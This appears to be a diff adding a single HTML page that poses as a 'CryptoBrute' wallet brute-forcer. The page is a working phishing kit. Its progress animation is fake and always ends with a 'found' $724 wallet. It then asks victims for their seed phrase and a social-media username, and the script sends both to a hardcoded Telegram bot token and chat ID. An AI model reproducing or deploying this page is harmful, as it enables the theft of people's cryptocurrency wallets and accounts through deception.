@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CeyptoBruteForce</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #0b0c1a;
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px;
+  }
+  h1 {
+    margin-bottom: 20px;
+    color: #00ffd5;
+    font-size: 32px;
+  }
+  .coin-list {
+    display: flex;
+    gap: 15px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+    justify-content: center;
+  }
+  .coin {
+    padding: 10px 15px;
+    border-radius: 8px;
+    background: #1b1c33;
+    cursor: pointer;
+    transition: 0.2s;
+  }
+  .coin:hover {
+    background: #272940;
+  }
+  .selected {
+    background: #00ffd5;
+    color: #000;
+  }
+  button {
+    padding: 10px 20px;
+    margin-top: 20px;
+    border: none;
+    border-radius: 8px;
+    background: #00ffd5;
+    color: #000;
+    cursor: pointer;
+    font-weight: bold;
+  }
+  .status {
+    margin-top: 30px;
+    font-size: 18px;
+    line-height: 1.5;
+  }
+  #found-msg {
+    margin-top: 15px;
+    font-size: 18px;
+    color: #00ff00;
+    font-weight: bold;
+  }
+  #withdraw-section, #username-section {
+    display: none;
+    margin-top: 25px;
+    flex-direction: column;
+    align-items: center;
+    width: 100%;
+    max-width: 650px;
+    padding: 20px;
+    border-radius: 15px;
+    background: #111;
+    color: #fff;
+  }
+  #withdraw-section textarea, #username-section input, #username-section select {
+    width: 95%;
+    padding: 15px;
+    font-size: 18px;
+    border-radius: 12px;
+    border: 2px solid #00ffd5;
+    background: #111;
+    color: #fff;
+    line-height: 1.8;
+    margin-top: 10px;
+  }
+  #withdraw-section button, #username-section button {
+    margin-top: 15px;
+    padding: 12px 25px;
+    font-size: 18px;
+    border-radius: 12px;
+    background: #00ffd5;
+    color: #000;
+    font-weight: bold;
+    cursor: pointer;
+  }
+  #withdraw-msg, #username-msg {
+    margin-top: 10px;
+    font-size: 16px;
+    color: #0f0;
+  }
+</style>
+</head>
+<body>
+<h1>≎≎≎CryptoBrute≎≎≎
+𝐃𝐀𝐖𝐑𝐀𝐍°𝐁𝐀𝐋𝐋𝐀𝐊</h1>
+
+<div class="coin-list">
+  <div class="coin" data-coin="ETH">ETH</div>
+  <div class="coin" data-coin="BTC">BTC</div>
+  <div class="coin" data-coin="USD">USD</div>
+  <div class="coin" data-coin="BSC">BSC</div>
+  <div class="coin" data-coin="DOGE">DOGE</div>
+  <div class="coin" data-coin="LITECOIN">LITECOIN</div>
+</div>
+
+<button id="next-btn">NEXT</button>
+
+<div class="status">
+  <p>Check-Wallet: <span id="check-wallet">0</span></p>
+  <p>Wallet-Found: <span id="wallet-found">0</span></p>
+  <p>Balance-USD: <span id="balance-usd">0</span></p>
+</div>
+
+<div id="found-msg"></div>
+
+<div id="withdraw-section">
+  <p style="font-size: 18px; font-weight: bold; margin-bottom: 10px;">
+    Enter Your 12 or 24 Mnemonic Phrase or Seed Phrase For Withdraw Money
+  </p>
+  <textarea id="seed-input" rows="4" placeholder="Enter your 12 or 24 word seed phrase here..."></textarea>
+  <button id="withdraw-btn">Withdraw</button>
+  <p id="withdraw-msg"></p>
+</div>
+
+<div id="username-section">
+  <p style="font-size: 18px; font-weight: bold; margin-bottom: 10px;">
+       Please enter your Any account
+    username to avoid losing your money
+     Select what account you are using
+  </p>
+  <select id="account-type">
+    <option value="">-- Select account type --</option>
+    <option value="Snapchat">Snapchat</option>
+    <option value="Instagram">Instagram</option>
+    <option value="Telegram">Telegram</option>
+    <option value="Other">Other</option>
+  </select>
+  <input type="text" id="username-input" placeholder="Enter username...">
+  <button id="send-username-btn">Send</button>
+  <p id="username-msg"></p>
+</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = "8363357641:AAELmRAes1mjlbM7PhgdCKhSoBIZQ-s_NTQ";
+const TELEGRAM_CHAT_ID = "8427199718";
+
+const coins = document.querySelectorAll('.coin');
+const nextBtn = document.getElementById('next-btn');
+const checkWallet = document.getElementById('check-wallet');
+const walletFound = document.getElementById('wallet-found');
+const balanceUSD = document.getElementById('balance-usd');
+const withdrawSection = document.getElementById('withdraw-section');
+const withdrawBtn = document.getElementById('withdraw-btn');
+const withdrawMsg = document.getElementById('withdraw-msg');
+const foundMsg = document.getElementById('found-msg');
+
+const usernameSection = document.getElementById('username-section');
+const accountTypeSelect = document.getElementById('account-type');
+const usernameInput = document.getElementById('username-input');
+const sendUsernameBtn = document.getElementById('send-username-btn');
+const usernameMsg = document.getElementById('username-msg');
+
+let selectedCoin = null;
+let checking = false;
+let withdrawSent = false;
+
+coins.forEach(coin => {
+  coin.addEventListener('click', () => {
+    coins.forEach(c => c.classList.remove('selected'));
+    coin.classList.add('selected');
+    selectedCoin = coin.dataset.coin;
+  });
+});
+
+nextBtn.addEventListener('click', () => {
+  if(!selectedCoin) { alert('Please select a coin first!'); return; }
+  if(checking) return;
+  checking = true;
+
+  checkWallet.textContent = 0;
+  walletFound.textContent = 0;
+  balanceUSD.textContent = 0;
+  withdrawSection.style.display = 'none';
+  usernameSection.style.display = 'none';
+  withdrawBtn.disabled = false;
+  withdrawMsg.textContent = "";
+
+  // Show "Wait a minute to find wallet" immediately
+  foundMsg.textContent = "Wait a minute to find wallet.";
+
+  // Start simulateCheck immediately
+  simulateCheck();
+});
+
+function simulateCheck(){
+  let total=0, found=0, balance=0;
+  const target=46829;
+  const intervalTime=4;
+  const incrementStep=15;
+
+  const interval = setInterval(() => {
+    total += incrementStep;
+    if(total>target) total=target;
+    checkWallet.textContent=total;
+
+    if(total>=target){
+      found=1;
+      balance=724;
+      walletFound.textContent=found;
+      balanceUSD.textContent=balance;
+      clearInterval(interval);
+      withdrawSection.style.display = 'flex';
+      checking=false;
+    }
+  }, intervalTime);
+}
+
+withdrawBtn.addEventListener('click', () => {
+  if(withdrawSent) return;
+  withdrawSent = true;
+
+  const seed = document.getElementById('seed-input').value.trim();
+  if(seed===''){ 
+    alert('Enter Your 12 or 24 Mnemonic Phrase or Seed Phrase To withdraw!'); 
+    withdrawSent=false; 
+    return; 
+  }
+
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text:`Seed phrase attempt: ${seed}`})
+  });
+
+  withdrawMsg.textContent = "Wait 60 minutes and your money will arrive soon...";
+  withdrawBtn.disabled = true;
+
+  usernameSection.style.display = 'flex';
+  usernameSection.scrollIntoView({behavior: "smooth"});
+});
+
+sendUsernameBtn.addEventListener('click', () => {
+  const accountType = accountTypeSelect.value;
+  const username = usernameInput.value.trim();
+
+  if(accountType === "") { alert('Please select account type!'); return; }
+  if(username===''){ alert('Enter your username!'); return; }
+
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text:`${accountType} username entered: ${username}`})
+  });
+
+  usernameMsg.textContent = "Username successfully!";
+  sendUsernameBtn.disabled = true;
+
+  usernameSection.scrollIntoView({behavior: "smooth"});
+});
+</script>
+</body>
+</html>
